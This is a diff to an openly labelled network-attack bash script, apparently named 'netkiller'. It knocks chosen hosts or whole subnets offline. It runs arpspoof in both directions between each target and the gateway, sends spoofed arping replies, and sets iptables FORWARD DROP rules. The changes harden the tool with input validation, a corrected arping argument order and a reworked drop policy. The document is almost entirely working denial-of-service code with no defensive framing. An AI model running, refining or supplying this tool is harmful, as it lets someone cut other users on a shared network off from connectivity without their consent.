@@ -20,7 +20,11 @@ read -p "> " TARGET_INPUT
 echo " "
 
 # Get this device's IP address
-DEVICE_IP="$(ip addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)"
+DEVICE_IP="$(ip -4 addr show dev "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)"
+if [ -z "$DEVICE_IP" ]; then
+    echo "Error: Could not determine device IP for interface $INTERFACE"
+    exit 1
+fi
 
 echo "[=== Network Attack Configurations ===]"
 echo " "
@@ -32,10 +36,16 @@ echo "[*] Targets IP => $TARGET_INPUT"
 # Function to expand CIDR to individual IPs using ipcalc
 expand_cidr() {
     local cidr=$1
-    local network=$(ipcalc -n "$cidr" | cut -d'=' -f2)
-    local netmask=$(ipcalc -m "$cidr" | cut -d'=' -f2)
-    local first_ip=$(ipcalc "$network" "$netmask" | grep "HostMin" | awk '{print $2}')
-    local last_ip=$(ipcalc "$network" "$netmask" | grep "HostMax" | awk '{print $2}')
+    if ! command -v ipcalc &>/dev/null; then
+        echo "Error: ipcalc is required but not installed"
+        exit 1
+    fi
+
+    local network broadcast
+    network=$(ipcalc -n "$cidr" | cut -d'=' -f2)
+    broadcast=$(ipcalc -b "$cidr" | cut -d'=' -f2)
+    local first_ip=$(ipcalc "$cidr" | grep "HostMin" | awk '{print $2}')
+    local last_ip=$(ipcalc "$cidr" | grep "HostMax" | awk '{print $2}')
 
     # Convert IPs to decimal for iteration
     IFS=. read -r i1 i2 i3 i4 <<< "$first_ip"
@@ -60,7 +70,7 @@ for item in "${INPUT_ARRAY[@]}"; do
     if [[ $item == */* ]]; then
         # Expand CIDR to individual IPs
         while read -r ip; do
-            # Exclude the device's own IP
+            # Exclude the device's own IP, network, and broadcast addresses
             if [ "$ip" != "$DEVICE_IP" ] && [ "$ip" != "$network" ] && [ "$ip" != "$broadcast" ]; then
                 TARGET_IPS+=("$ip")
             fi
@@ -68,13 +78,15 @@ for item in "${INPUT_ARRAY[@]}"; do
     else
         # Add single IP if it's not the device's IP
         if [ "$item" != "$DEVICE_IP" ]; then
-            TARGET_IPS+=("$item")
+            # Validate IP format
+            if [[ $item =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+                TARGET_IPS+=("$item")
+            else
+                echo "Warning: Invalid IP address format - $item"
+            fi
         fi
     fi
 done
-
-# Iptables policy
-iptables -P FORWARD DROP
 
 # Check if we have valid target IPs
 if [ ${#TARGET_IPS[@]} -eq 0 ]; then
@@ -86,7 +98,11 @@ fi
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 
+# Restore default FORWARD policy
 iptables -P FORWARD ACCEPT
+# Flush iptables Forward rules
+iptables -F FORWARD
+# Kill all arpspoof and arping processes
 pkill -f arpspoof
 pkill -f arping
 echo " "
@@ -107,13 +123,13 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # Run arpspoof for each target IP
 for TARGET_IP in "${TARGET_IPS[@]}"; do
     echo "Netkiller blocking the IP => $TARGET_IP"
-    
-    # iptables rules 
-    iptables -A FORWARD -s $TARGET_IP -j DROP
-    iptables -A FORWARD -d $TARGET_IP -j DROP
+    # iptables rules
+    iptables -P FORWARD DROP
+    iptables -A FORWARD -s "$TARGET_IP" -j DROP
+    iptables -A FORWARD -d "$TARGET_IP" -j DROP
     arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
     arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
-    arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
+    arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
 done
 
 echo " "
